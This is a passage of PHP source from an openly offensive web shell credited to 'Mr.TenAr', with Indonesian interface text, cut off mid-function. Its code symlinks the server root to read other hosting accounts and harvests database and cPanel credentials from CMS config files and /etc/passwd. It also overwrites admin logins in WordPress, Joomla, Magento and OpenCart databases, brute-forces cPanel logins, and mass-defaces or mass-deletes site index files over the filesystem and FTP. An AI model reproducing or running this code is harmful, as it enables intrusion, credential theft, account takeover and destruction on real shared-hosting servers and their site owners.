 echo "<td align=center><font class=txt><a href=$full/Dark_Sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("Dark_Sym",0777);@chdir("Dark_Sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex 008
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <center><h2 class='k2ll33d2'>Symlink Web Server</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/Dark_Sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 } 
?>
<?php
} elseif($_GET['do'] == 'csrf') {
?>
<html>
<title>CSRF EXPLOITER ONLINE</title>
<style>
body{
background-color: black;background-image: url("https://i.imgur.com/Gl5U7Ff.png") ;background-repeat:no-repeat ;background-size: 100% 100%;}
}
</style>
<center><img src=https://tools.zone-dark.com/quotes.png height=300px width=300px>
<br><font color="#00FF00" face="Iceberg"><b>CSRF BY: Mr.TenAr<b><br>
<center>
<form method="post">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat Diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br><input type="submit" name="d" value="Kunci Target!"><br><br><font color=#00FF00>*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc
</form>
<?php
//gak penting
     @$url = $_POST['url'];
     @$pf = $_POST['pf'];
     @$d = $_POST['d'];
if($d) {
	echo "<script type='text/javascript'>swal('Target Berhasil Di Kunci', '$_POST[url]' , 'success')</script>";
	//baccod
	
    echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload Cok!'></form";
}
?>
</form>
</html>
<?php
} elseif($_GET['do'] == 'mass_deface') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=#48D1CC>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=#48D1CC>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
				echo "<script type='text/javascript'>swal('Berhasil Di Mass Deface', 'Happy Defacing' , 'success')</script>";
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Mr.TenAr</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;' class='btn btn-success btn-sm'>
	</form></center>";
	}
} elseif($_GET['do'] == 'mass_delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=#18BC9C>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
				echo "<script type='text/javascript'>swal('Berhasil Di Mass Delete', 'Happy Defacing' , 'success')</script>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Mass Delete' style='width: 450px;' class='btn btn-success btn-sm'>
	</form></center>";
	}
} elseif($_GET['do'] == 'config') {
	$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
	$idx = mkdir("idx_config", 0777);
	$isi_htc = "Options all\nRequire None\nSatisfy Any";
	$htc = fopen("idx_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $user_idx) {
				$user_config_dir = "/home/$user_idx/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$user_idx/.my.cnf" => "cpanel",
						"/home/$user_idx/.accesshash" => "WHM-accesshash",
						"/home/$user_idx/public_html/po-content/config.php" => "Popoji",
						"/home/$user_idx/public_html/vdo_config.php" => "Voodoo",
						"/home/$user_idx/public_html/bw-configs/config.ini" => "BosWeb",
						"/home/$user_idx/public_html/config/koneksi.php" => "Lokomedia",
						"/home/$user_idx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
						"/home/$user_idx/public_html/clientarea/configuration.php" => "WHMCS",
						"/home/$user_idx/public_html/whm/configuration.php" => "WHMCS",
						"/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS",
						"/home/$user_idx/public_html/forum/config.php" => "phpBB",
						"/home/$user_idx/public_html/sites/default/settings.php" => "Drupal",
						"/home/$user_idx/public_html/config/settings.inc.php" => "PrestaShop",
						"/home/$user_idx/public_html/app/etc/local.xml" => "Magento",
						"/home/$user_idx/public_html/joomla/configuration.php" => "Joomla",
						"/home/$user_idx/public_html/configuration.php" => "Joomla",
						"/home/$user_idx/public_html/wp/wp-config.php" => "WordPress",
						"/home/$user_idx/public_html/wordpress/wp-config.php" => "WordPress",
						"/home/$user_idx/public_html/wp-config.php" => "WordPress",
						"/home/$user_idx/public_html/admin/config.php" => "OpenCart",
						"/home/$user_idx/public_html/slconfig.php" => "Sitelok",
						"/home/$user_idx/public_html/application/config/database.php" => "Ellislab");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("idx_config/$user_idx-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<center><a href='?dir=$dir/idx_config'><font color=#48D1CC>Done</font></a></center>";
} elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=#48D1CC>R</font>] <a href='?dir=$url_user'><font color=#48D1CC>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=#48D1CC>RW</font>] <a href='?dir=$url_user'><font color=#48D1CC>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" class="btn btn-success btn-sm" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=#18BC9C>R</font>] <a href='?dir=$web_vh'><font color=#18BC9C>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=#18BC9C>RW</font>] <a href='?dir=$web_vh'><font color=#18BC9C>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=#18BC9C>R</font>] <a href='?dir=$user_jumping_dir'><font color=#18BC9C>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=#18BC9C>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#18BC9C>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
} elseif($_GET['do'] == 'auto_edit_user') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gak bisa ambil nama domain nya ..</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=#18BC9C>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gak bisa ambil nama domain nyaa ..</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=#18BC9C>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gak bisa ambil nama domain nyaa ..</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=#18BC9C>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=#18BC9C>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gak bisa ambil nama domain nyaa ..</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font><br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>wkwk, next web aja yaa :v</font><br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gak bisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=#18BC9C>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='Mr.TenAr' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='Mr.TenAr' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' class='btn btn-success btn-sm' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
} elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gak bisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=#18BC9C>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=#18BC9C>$ucp</font>) password (<font color=#18BC9C>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=#18BC9C>Mr.TenAr-TEAM</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' class='btn btn-success btn-sm' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'cpftp_auto') {
	if($_POST['crack']) {
		echo "<script type='text/javascript'>swal('Berhasil Di Crack Cpanel', 'Selamat Deface' , 'success')</script>";
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							//
						} else {
							echo "[+] username (<font color=#48D1CC>$ucp</font>) password (<font color=#48D1CC>$pcp</font>)<br>";
							$ftp_conn = ftp_connect($ip);
							$ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
							if((!$ftp_login) || (!$ftp_conn)) {
								echo "[+] <font color=red>Login Gagal</font><br><br>";
							} else {
								echo "[+] <font color=#48D1CC>Login Sukses</font><br>";
								$fi = htmlspecialchars($_POST['file_deface']);
								$deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
								if($deface) {
									$i++;
									echo "[+] <font color=#48D1CC>Deface Sukses</font><br>";
									if(function_exists('posix_getpwuid')) {
										$domain_cp = file_get_contents("/etc/named.conf");	
										if($domain_cp == '') {
											echo "[+] <font color=red>gak bisa ambil nama domain nya</font><br><br>";
										} else {
											preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
											foreach($domains_cp[1] as $dj) {
												$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
												$user_cp_url = $user_cp_url['name'];
												if($user_cp_url == $ucp) {
													echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
													break;
												}
											}
										}
									} else {
										echo "[+] <font color=red>gak bisa ambil nama domain nya</font><br><br>";
									}
								} else {
									echo "[-] <font color=red>Deface Gagal</font><br><br>";
								}
							}
							//echo "username (<font color=#48D1CC>$ucp</font>) password (<font color=#48D1CC>$pcp</font>)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses deface ".$i." Cpanel by <font color=#48D1CC>Mr.TenAr.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		Filename: <br>
		<input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
		Deface Page: <br>
		<input type='text' name='deface' placeholder='http://www.web-yang-udah-di-deface.com/filemu.php' style='width: 450px;'><br>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
